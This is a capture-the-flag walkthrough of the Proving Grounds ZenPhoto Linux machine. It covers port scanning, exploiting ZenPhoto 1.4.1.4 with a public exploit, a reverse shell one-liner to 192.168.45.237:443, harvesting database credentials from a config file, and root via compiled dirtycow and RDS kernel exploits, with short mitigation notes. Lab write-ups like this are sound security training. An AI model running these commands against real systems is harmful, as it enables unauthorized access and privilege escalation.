## Introduction

In this walkthrough we will be solving Proving Grounds Intermediate Linux box ZenPhoto. Let’s start ..

## Nmap

### TCP Scan
Run a quick nmap scan to see open ports on our target:

```bash
sudo nmap -sV $IP --open
```
![TCP Scan](image1.png)
_TCP Scan_

### UDP Scan
Run UDP Scan to top 100 ports to not to miss any valuable service.

```bash
sudo nmap -sU -F $IP
```
![UDP Scan](image2.png)
_UDP Scan_
No valuable UDP ports are identified.

### Full Nmap Scan
Run a full Nmap scan while you are interacting with previously identified services.
```bash
sudo nmap -sV -sC -p- $IP -Pn -n --open 
```
## Services
### Port 22
We usually skip OpenSSH.
### Port 23
Searching for public exploits `searchsploit CUPS`
![searchsploit command](image3.png)
Nothing very interesting comes to attention.
### Port 3306
Trying to connect to MySQL service using `root` and `no password` says our host is now allowed to connect to this service.
```bash
mysql -h $IP -u root --ssl=0
```

## Web
### Port 80
- Searching for public exploits `searchsploit apache 2.2.14` reveals:
  ![searchsploit](image5.png)
- Accessing the web page it shows **Under Construction** which means this is a potential point of further investigation.
- Directory Fuzzing
```bash
gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42
```

Reading the source code of **\test** directory we can see **zenphoto version 1.4.1.4**

## Exploitation
I am gonna search for public exploits for this version of commercial web application ZenPhoto
```bash
searchsploit zenphoto 1.4.1.4
```
![zenphoto](image7.png)
**That's it!** We found a public exploit for this version.
```bash
php 18083.php $IP /test/
```
![shell](image8.png)
```bash
bash -c 'bash -i >& /dev/tcp/192.168.45.237/443 0>&1'
```
I got reverse shell.

## Privilege Escalation
When I am doing privilege escalation on a Linux Box, I follow the following checklist:
- **Situational Awareness** - get as much information as possible about your user, target machine (`id`, `whoami`, `uname  -a`)
- **Exposed Confidential Information** (`env`, `.bashrc`)
- **Password Authentication Abuse** - check permissions on `/etc/passwd` and `/etc/shadow`
- **Sudo** (`sudo -l`)
- **SUID/SGID**
- **Capabilities**
- **Cron Jobs**
- **Hunting for sensitive information** in `.txt.`, `.php`, `.conf` files
- **Kernel Exploits**

Under `/var/www/test/zp-data` I found `.conf` file where credentials for database were stored, you can find them also running [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
![conf file](image10.png)
Then I tried to connect to MySQL database
```bash
mysql -h 127.0.0.1 -u root -p
```
![mysql connection](image11.png)
```sql
show databases;
select zenphoto;
```
Digging in database I found probably encrypted credentials of admin user.
![database](image12.png)

Then I switched to mysql database:
```sql
select mysql;
```
![mysql database](image13.png)
Here are kept credentials that are used to connect to database service, but nothing useful find here either.

I tried to crack it in hope it is a hash, with hashcat and [Crackstation.net](https://crackstation.net/) but that didn't work.

I tried nearly everything in my checklist except for Kernel exploits and decided to take a closer look of linpeas.sh output, as linpeas.sh simultaneously runs Linux Exploit Suggester we actually can find kernel exploits there. I found two interesting candidates:
![kernel](image14.png)
> Pay attention to they are labeled as highly-probable privilege escalation paths.
{: .prompt-warning}

Let's run them:
1. `dirtycow`
   I compiled exploit on the target machine
   ```bash
  gcc 40839.c -o exploit
   ```
   ![dirtycow](image15.png)
2. `rds`
  [exploit](https://www.exploit-db.com/exploits/15285)
  ```bash
  gcc 15285.c -o exploit
  ```
  ![rds](image16.png)
  it worked now.

**Now we are root!**

## Mitigation
- **Upgrade ZenPhoto**: The oldest secure version is 1.5.8 (latest is recommended).
- **Update Linux**
